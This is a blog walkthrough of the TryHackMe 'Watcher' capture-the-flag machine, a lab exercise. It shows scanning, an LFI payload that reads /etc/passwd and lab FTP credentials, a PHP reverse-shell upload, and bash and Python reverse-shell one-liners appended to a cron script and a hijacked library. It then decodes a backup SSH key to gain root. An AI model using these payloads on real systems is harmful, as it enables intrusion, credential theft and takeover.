<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/" rel="category tag">TryHackME</a></span>            </div>
            <h1 class="post-title entry-title">Watcher TryHackMe Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/watcher-tryhackme-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-05-23T20:05:28+00:00">May 23, 2021</time><time class="updated" datetime="2025-06-10T20:06:35+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today it is time to solve another challenge called “Watcher”. It is available at TryHackMe for penetration testing practice. The challenge is of medium difficulty if you have the right basic knowledge and are attentive to little details that are required in the enumeration process. The credit for making this machine goes to <strong><a style="color: #000000;" href="https://twitter.com/rushisec">Will (@rushisec)</a></strong>. The breakdown of the Machine with the redacted flags is as follow:</span></p>
<p><span style="color: #000000;"><strong>Level: Medium</strong></span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning </strong></span>
<ul>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating HTTP Service</span></li>
<li><span style="color: #000000;">Directory Bruteforce using dirb</span></li>
<li><span style="color: #000000;">Reading robots.txt</span></li>
<li><span style="color: #000000;">Reading Flag 1</span></li>
<li><span style="color: #000000;">Enumerating PHP file</span></li>
<li><span style="color: #000000;">Detecting LFI</span></li>
<li><span style="color: #000000;">Enumerating FTP credentials</span></li>
<li><span style="color: #000000;">Logging in FTP Service</span></li>
<li><span style="color: #000000;">Reading Flag 2</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation </strong></span>
<ul>
<li><span style="color: #000000;">Uploading reverse shell through FTP</span></li>
<li><span style="color: #000000;">Running shell using LFI</span></li>
<li><span style="color: #000000;">Getting shell as www-data</span></li>
<li><span style="color: #000000;">Reading Flag 3</span></li>
<li><span style="color: #000000;">Enumerating Sudo Permissions</span></li>
<li><span style="color: #000000;">Getting shell as Toby</span></li>
<li><span style="color: #000000;">Reading Flag 4</span></li>
<li><span style="color: #000000;">Enumerating Cron Jobs</span></li>
<li><span style="color: #000000;">Exploiting Cronjob</span></li>
<li><span style="color: #000000;">Getting shell as Mat</span></li>
<li><span style="color: #000000;">Reading Flag 5</span></li>
<li><span style="color: #000000;">Enumerating Sudo Permissions</span></li>
<li><span style="color: #000000;">Exploiting Python Library Hijacking</span></li>
<li><span style="color: #000000;">Getting shell as Will</span></li>
<li><span style="color: #000000;">Reading Flag 6</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating Groups</span></li>
<li><span style="color: #000000;">Enumerating Base64 encoded key</span></li>
<li><span style="color: #000000;">Decrypting Key</span></li>
<li><span style="color: #000000;">Using Key to login via SSH</span></li>
<li><span style="color: #000000;">Getting Root shell</span></li>
<li><span style="color: #000000;">Reading Flag 7</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<p><span style="color: #000000;">There are seven flags in this machine to discover. After Booting up the target machine from the <strong><a style="color: #000000;" href="https://www.tryhackme.com/room/watcher">TryHackMe: Watcher CTF Page</a></strong>, an IP will be assigned to the machine and will be visible on that page as well.</span></p>
<p><span style="color: #000000;"><strong>IP Address: 10.10.49.142</strong></span></p>
<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
<p><span style="color: #000000;">We will start a nmap scan with the -sC for Default Scripts and -sV for Scanning Versions.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.10.49.142</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xpOeDoqt3DE/YKquW4IOz_I/AAAAAAAAwCY/rTOpn-ebDMImJF3azIB09iysAZGhGakzwCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Nmap was able to identify 3 services running on the target machine. It includes the FTP (21), SSH (22) and HTTP (80). We don’t have the credentials for the SSH so we cannot enumerate it and FTP doesn’t have Anonymous Login enabled. Only service that is left is the HTTP service.</span></p>
<h3><span style="color: #800000;"><strong>Enumeration </strong></span></h3>
<p><span style="color: #000000;">Starting with the HTTP service, we try to enumerate by accessing the IP Address of the target machine on a Web Browser. We see a website that features some weird merchandise. It has the cork-based placements. After looking around for a while we were unable to find something that might help us to exploit the machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.49.142/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2Osw6_xsguU/YKqupErSfTI/AAAAAAAAwCg/BEu5qCRolu0eMAZ1jRONpaSHFGjnzXd1QCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Next order of enumeration, is to perform a directory Bruteforce. We will be using the drib tool for this Bruteforce. You can use gobuster or any other tool as per your convenience. We have added the Extension filter to streamline the enumeration process. We have configured the dirb to look for the php files and txt files. We were able to get a robots.txt and post.php files.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.49.142/ -X.php,.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-P46727BYud0/YKquu0ZMQiI/AAAAAAAAwCk/9LoFWfJ-9boqdExOzHY-vzZyc6wbdY9AQCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">First, we tried to read the contents of robots.txt file. We see that it has an 2 entries. One of them is the flag_1.txt file and another is the secret_file_do_not_read.txt. Let’s take a look at the flag file first.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.49.142/robots.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-m2dCuD-Vu7U/YKqu437JIeI/AAAAAAAAwCs/uP7LoFysltUwvxRf7Eeczg9aHfyucPlHgCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">We change the URL to read the flag_1.txt file to read the first flag in the machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.49.142/flag_1.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8fGoJLHgF64/YKqvAgfXWtI/AAAAAAAAwC0/MT2Hh4Am1oQHkXgXJDD9OrSTDSKI7qT_QCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">We tried to read the secret file but we were unable to do so from the browser directly like the flag 1. We went back to the dirb scan result and found the post.php file. It has the header of the website and the footmark. There is nothing of much interest here.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.49.142/post.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-skPgOO1i1nQ/YKqvGbJcJRI/AAAAAAAAwC4/a8drYR4U0kkEguj4EXILhCzCxjG9dE2VwCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">We went back to the original webpage and started to enumerate different products. Here, we noticed that when we clicked on the image of the merchandise, it invokes the post.php file that we found earlier. We also saw that there is a parameter that is supposed to work with the php file. This was missing when we tried to run the php file directly hence we were not able to observe anything.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.49.142/post.php?post=striped.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_g3vL4iWYAs/YKqvQov8bfI/AAAAAAAAwDE/YtplvnEM-lcy8gbMLk9t1M-HNQsZQKjfgCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">Anyhow, since we have a php file with a parameter it is an entry point where we can inject scripts or different values that could lead to execution on the server side if the input to that parameter is not filtered. One of the first things that we tried was a Local File Inclusion script. We were able to read the passwd file as depicted below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.49.142/post.php?post=../../../../../../etc/passwd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-F-C1m9kWcxc/YKqvas8eDnI/AAAAAAAAwDM/ocjNlB0pE-sy3EEpXQS0mcBjTsfcHiclACLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">From the working of the php file, it was clear that it is being used to fetch the webpages. The structure of webpages is usually designed in such way that the robots.txt and other files will possible be in the same directory as well. Since we were not able to read the secret file directly earlier, let’s try to read the file through the Local File Inclusion now. We see that there is the ftp data location as well as the credentials to access the FTP service.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.49.142/post.php?post=secret_file_do_not_read.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uzYk7PLuPjA/YKqvjtNtw9I/AAAAAAAAwDU/ZtPgk1E1J7gptoTSLweABun9A_AVm4JzwCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">We connect to the FTP service using the credentials that we just found. We then move over to look around for files that might be shared on FTP. We found a directory by the name of files and the flag 2. We transfer the flag back to the local Kali Machine to read it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 10.10.49.142
ftpuser
givemefiles777
ls -la
get flag_2.txt
cd files
ls -la
bye
cat flag_2.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-p_5UInkiruo/YKqvpH7rnGI/AAAAAAAAwDY/CUXMPa4j4WoUB__iKjLrUDNMNhuFcMb2gCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">The files directory that was found on FTP was empty but when we took a closer look at the permission of the directory, we found that it is possible to upload files to that directory. With the ability to upload files using FTP and then the ability to run the file using the Local File Inclusion, it is possible to get initial foothold on the target machine.</span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Exploitation</span> </strong></span></h3>
<p><span style="color: #000000;">We use the php reverse shell that is located at the /usr/share/webshells/php/php-reverse-shell.php and edited it to add our local IP Address [VPN IP Address] on it to get the shell back to our listener.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano shell.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4C-F4rRm45Q/YKqvvtEo5cI/AAAAAAAAwDc/VHS9srvOiCgJ6bLqDXYxZFUCm9c4PvO0QCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">We reconnect to the FTP service as the ftpuser and then upload the shell.php file inside the files directory using the put command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 10.10.49.142
ftpuser
givemefiles777
cd files
put shell.php
bye</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_4sugFJmsOg/YKqv03nGKtI/AAAAAAAAwDk/uomv1xYbpPI__XHCthcsQO0BMzOnXKhBACLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Then we get to the web browser and using the location that we learned from the secret file, we try to browse the shell.php file that we just uploaded. However, we open a Netcat listener on the port that was mentioned in the shell.php file i.e., 1234.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.49.142/post.php?post=/home/ftpuser/ftp/files/shell.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0i8kxIdWTBQ/YKqv-QRBFQI/AAAAAAAAwDs/pRirz51iC2QKFatmq0LuA7v2pPXvg_tVQCLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">As soon as we execute the shell.php using the Local File Inclusion, we get back to the Netcat listener that we ran earlier. We see that we have a session from the target machine. The session that was generated was for the user www-data. We use the python one-liner to convert the shell that we got to the TTY shell for easier usage.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234
python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cnlAbA1IgZI/YKqwDdej6ZI/AAAAAAAAwD0/Yp5aVzZ31OIO-rMBXIBPqrDCyEaKI6sxACLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">We land into the root directory, and decided to start enumerating for more flags from the /var/www/html directory. When we listed the contents of that directory, we found a directory with the name of more_secrets_a9f10a. After getting inside this directory, we found our third flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /var/www/html
ls
cd more_secrets_a9f10a/
ls
cat flag_3.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FMyzPHQVwec/YKqwNkkz1aI/AAAAAAAAwEA/J2s__fhVImU-jMmDCVGmpIZLMqjwtEvxQCLcBGAsYHQ/s16000/15.png"/></span></p>
<p><span style="color: #000000;">We tried to look around for more flags, but we were unable to locate more. Then we dropped looking for flags and started enumeration for elevating privileges to root. We tried to enumerate the sudo permissions for the current user and found that we can run all commands as toby user. We invoked the bash using sudo and get the access as toby user. Then we traversed inside the home directory of the toby user to find our fourth flag and a note.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l
sudo -u toby /bin/bash
cd ~
ls -la
cat flag_4.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BRGi6tPp_sg/YKqwRnWmrcI/AAAAAAAAwEE/gUJLYZRsp985dNkyIi8v61yEwPeBYJYoACLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">Reading the note.txt we see that there is a mention of the cronjobs. We investigate the cronjobs by reading the /etc/crontab file. We found a shell script that is located inside the jobs directory named cow.sh. It gets executed as the user mat. We inspected the permissions on the cow.sh file to find that it is writable by the toby user. Also upon reading the contents of the shell script we see that it copies a image file from mat users home directory to temp directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat note.txt
cat /etc/crontab
ls -la /home/toby/jobs/
cat /home/toby/jobs/cow.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-I_R5ubZE3jQ/YKqwWQzkuQI/AAAAAAAAwEM/b8u8u964Ux8OXt_SdTVTLHKzBLydnjC-ACLcBGAsYHQ/s16000/17.png"/></span></p>
<p><span style="color: #000000;">Using the echo command, we insert a reverse shell script pointed to our local IP Address [VPN IP Address] on port 8080.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "bash -i &gt;&amp; /dev/tcp/10.10.73.100/8080 0&gt;&amp;1" &gt;&gt; /home/toby/jobs/cow.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gkX4nBv39V4/YKqwef5NlGI/AAAAAAAAwEQ/fTsF8WFkKrIKUugEr2ZQkTE0HwoMuuPMwCLcBGAsYHQ/s16000/18.png"/></span></p>
<p><span style="color: #000000;">We start a netcat listener on the port 8080 on the local Kali Machine. The cronjob executes the shell script and invokes a reverse shell to our netcat listener. The shell that we have received is for the mat user. We listed the contents of the home directory of mat user. We found a note, a directory named scripts and the flag 5.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 8080
ls -la
cat flag_5.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EfCzDBqJ1O8/YKqwjtCugMI/AAAAAAAAwEY/FCPuLBWzILAN7iI4m48mJJel0tXuUOWPACLcBGAsYHQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">Upon reading the note, we find that we need to run a python script with sudo to elevate privileges. To check what kind of script we can run with sudo, we ran sudo -l command. It revealed that we can run the will_script.py as will user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat note.txt
sudo -l</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oGwrENmo9us/YKqwoEWpvtI/AAAAAAAAwEg/Jcal_P4P74kdW1qRAJKHM12amRtGJmEMACLcBGAsYHQ/s16000/20.png"/></span></p>
<p><span style="color: #000000;">Now that we know that we need to run a python script, we traversed into the scripts directory to take a look at the script to run. We found 2 scripts inside: cmd.py and will_script.py. Reading the will_script.py we see that it is a filter script. It restricts the user from running commands other than ls, id and cat /etc/passwd commands. It uses a python library named cmd. The library asks for a numeric entry and then it runs one of the three command mentioned earlier. Since we have library inside the same directory as the script, we can hijack the library to run a reverse shell python script.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd scripts
ls
cat will_script.py
cat cmd.py</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-t5QV3T-303A/YKqwy08LwVI/AAAAAAAAwEs/b1tohRRqBxk50DBTYfQvjiyfrGqxVUxlgCLcBGAsYHQ/s16000/21.png"/></span></p>
<p><span style="color: #000000;">To do we will use the echo command to insert the python reverse shell script inside the python library script is using i.e., cmd.py. After doing so, we will run a netcat listener on the same port that we mentioned inside the reverse shell script. Now all that is left is to run the python script will_script.py as will user using sudo.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.73.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' &gt;&gt; /home/mat/scripts/cmd.py
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-73AhQIG2Mqc/YKqw_dMTW0I/AAAAAAAAwE0/qKfJbi4XISs4NvslUsvYaQ-Tea4m6lLjgCLcBGAsYHQ/s16000/22.png"/></strong></span></p>
<p><span style="color: #000000;">After running the script as will user, we get back to our local machine where we ran the netcat listener earlier. We see that we have received a shell as the will user. We check the contents of the will user’s home directory to find the flag6.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 4444
ls
cat flag_6.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-r_6tFMRB17o/YKqxVTuxHEI/AAAAAAAAwFI/lLye3FhFQ78MFyiFAkZtCZ6ILM8c3btAACLcBGAsYHQ/s16000/23.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Now that we have the will user, we need to elevate privilege to root user to conclude this machine. While exploring various options, we found two things. One was that the will user was part of adm group. This was checked using the id command. Secondly when we checked for the files that are accessible for the adm group we found some in the /opt directory. We got to the /opt directory to find another directory by the name of backups. Reading the data from backups directory, we found a key that was encoded in base64.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">id
cd /opt
cd backups
ls
cat key.b64</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Sy5WKpcr598/YKqxOH_Jx3I/AAAAAAAAwE8/7ktkQumyBfgujFXJJ_2Pq8JB5Vqwk6RdgCLcBGAsYHQ/s16000/24.png"/></span></p>
<p><span style="color: #000000;">We read the content of the key.b64 using the cat command and then proceeded to copy the contents of the key file and then on a terminal on our local machine created a copy of the same. Then we used the base64 -d command to decode the contents of the key. It turns out to be the private key that can be used to gain access on the target machine through the SSH service. We named the key as id_rsa and changed the permissions to readable to use to connect to SSH.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano key   
cat key | base64 -d           
cat key | base64 -d &gt;&gt; id_rsa
chmod 600 id_rsa</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8mkhrR7xTqc/YKqxeTIgvcI/AAAAAAAAwFM/38sVewgdhpoCq5GXnckqC-j33x-siEYzACLcBGAsYHQ/s16000/25.png"/></span></p>
<p><span style="color: #000000;">We connect to the target machine through the SSH service using the key that we created. After connecting we were able to secure the last and final flag for this machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i id_rsa root@10.10.49.142
ls
cat flag_7.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4LAYhp1mrP8/YKqxi9hEPgI/AAAAAAAAwFQ/VyLLwNVNKCIiCfy2MNAF437LlkSuhIgLACLcBGAsYHQ/s16000/26.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on <strong>Twitter</strong> and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-related-none yarpp-template-thumbnails">
